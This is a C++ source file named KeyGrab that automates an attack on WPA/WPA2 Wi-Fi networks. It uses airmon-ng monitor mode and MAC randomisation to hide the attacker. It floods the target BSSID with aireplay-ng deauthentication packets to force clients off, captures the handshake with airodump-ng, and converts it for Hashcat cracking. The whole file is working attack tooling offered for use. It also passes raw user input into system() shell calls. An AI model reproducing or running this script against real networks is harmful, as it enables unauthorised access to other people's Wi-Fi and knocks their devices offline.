/***********************************************
*FILENAME:		KeyGrab.cpp 
*AUTHOR: 		Ryan Sisco
*REQUIREMENTS:	macchanger & aircrack-ng plugins
*DATE:			JAN 2017
*DESCRIPTION:	intercepts WPA/WPA2 password keys
***********************************************/



#include <iostream>
#include <cstdlib>
#include <string>

using namespace std;
string get_bssid(string);				//prompts and returns bssid
string get_channel(string);				//prompts and returns channel
void clean();							//resets wlan0
void randomize();						//randomizes mac address
void reset_mac();						//resets mac address
void gnome_terminal(string, string);	//opens second terminal and executes deauth
void organize(string);					//stores Keys in folders
void closing();							//closes out program with text and spacing





int main() {
	string dir, t_mac_a, bssid, channel, deauth;
	bssid = get_bssid(bssid); 
	channel = get_channel(channel);
	dir = "mkdir " + bssid;
	system(dir.c_str());
	t_mac_a = "airmon-ng start wlan0 " + channel;
	system(t_mac_a.c_str());
	randomize();
	gnome_terminal(bssid, channel);
	deauth = "aireplay-ng -0 0 -a " + bssid + " wlan0mon";
	system(deauth.c_str());
	closing();
	organize(bssid);
	reset_mac();
	clean();
}





/***********************************************
*FUNCTION:     clean
*RETURNS:	   nothing
*DESCRIPTION:  stops monitor mode and restarts  
*              network manager
***********************************************/
void clean() {
	system("airmon-ng stop wlan0mon");
	system("sudo service network-manager restart");
	system("ifconfig wlan0 up");
}





/***********************************************
*FUNCTION:     randomize
*RETURNS:	   nothing
*DESCRIPTION:  randomizes local MAC address  
*              
***********************************************/
void randomize() {
	system("ifconfig wlan0mon down");
	system("macchanger -a wlan0mon");
	system("ifconfig wlan0mon up");
}





/***********************************************
*FUNCTION:     reset_mac
*RETURNS:	   nothing
*DESCRIPTION:  resets local MAC address  
*              
***********************************************/
void reset_mac() {
	system("ifconfig wlan0mon down");
	system("macchanger -p wlan0mon");
	system("ifconfig wlan0mon up");
}





/***********************************************
*FUNCTION:     gnome_terminal
*RETURNS:	   nothing
*DESCRIPTION:  creates a new window and enters  
*              deauth in that window
***********************************************/
void gnome_terminal(string mac, string ch) {
	string t_mac_a;
	t_mac_a = "gnome-terminal -x sh -c \" airodump-ng -c" + ch; 
	t_mac_a += " -w Key --bssid " + mac + " wlan0mon; bash\"";
	system(t_mac_a.c_str());
}





/***********************************************
*FUNCTION:     organize
*RETURNS:	   nothing
*DESCRIPTION:  creates folders and stores keys  
*              based on bssid
***********************************************/
void organize(string mac) {
	string dir;
	dir = "aircrack-ng -J Key-01 Key-01.cap"; //creates hccap file for Hashcat bruteforcing
	system(dir.c_str());
	dir = "mv Key-01.hccap " + mac + "/";
	system(dir.c_str());
	dir = "mv Key-01.cap " + mac + "/";
	system(dir.c_str());
	dir = "mv Key-01.csv " + mac + "/";
	system(dir.c_str());
	dir = "mv Key-01.kismet.csv " + mac + "/";
	system(dir.c_str());
	dir = "mv Key-01.kismet.netxml " + mac + "/";
	system(dir.c_str());
}





/***********************************************
*FUNCTION:     get_bssid
*RETURNS:	   bbsid
*DESCRIPTION:  randomizes MAC, enters monitor mode,
*			   prompts for bssid, returns it               
***********************************************/
string get_bssid(string bssid) {
	system("clear");
	system("echo \"$(tput setaf 1)$(tput bold).......................$(tput bold)$(tput sgr 0)\"");
	system("echo \"$(tput setaf 3)$(tput bold)-----------------------$(tput bold)$(tput sgr 0)\"");
	system("echo \"$(tput setaf 5)$(tput bold)|    K E Y G R A B    |$(tput bold)$(tput sgr 0)\"");
	system("echo \"$(tput setaf 3)$(tput bold)-----------------------$(tput bold)$(tput sgr 0)\"");
	system("echo \"$(tput setaf 1)$(tput bold).......................$(tput bold)$(tput sgr 0)\"");
	cout << string(2, '\n');
	cout << "Launching..." << endl;
	system("sleep 2");
	system ("airmon-ng start wlan0");
	randomize();
	system ("airodump-ng wlan0mon");
	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Target MAC Address:$(tput bold)$(tput smul)$(tput sgr 0)\"");
	cin >> bssid;
	return bssid;
}





/***********************************************
*FUNCTION:     get_channel
*RETURNS:	   channel number (string)
*DESCRIPTION:  prompts for channel and stops  
*              monitor mode
***********************************************/
string get_channel(string channel) {
	
	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Channel:$(tput sgr 0)\"");
	cin >> channel;
	system("airmon-ng stop wlan0mon");
	return channel;
}





/***********************************************
*FUNCTION:     closing
*RETURNS:	   nothing
*DESCRIPTION:  enters spacing and prints closing  
*              line
***********************************************/
void closing() {
	cout << string(5,'\n');
	system("echo \"$(tput bold)$(tput smul)$(tput setaf 6)Cleaning:$(tput sgr 0)\"");
}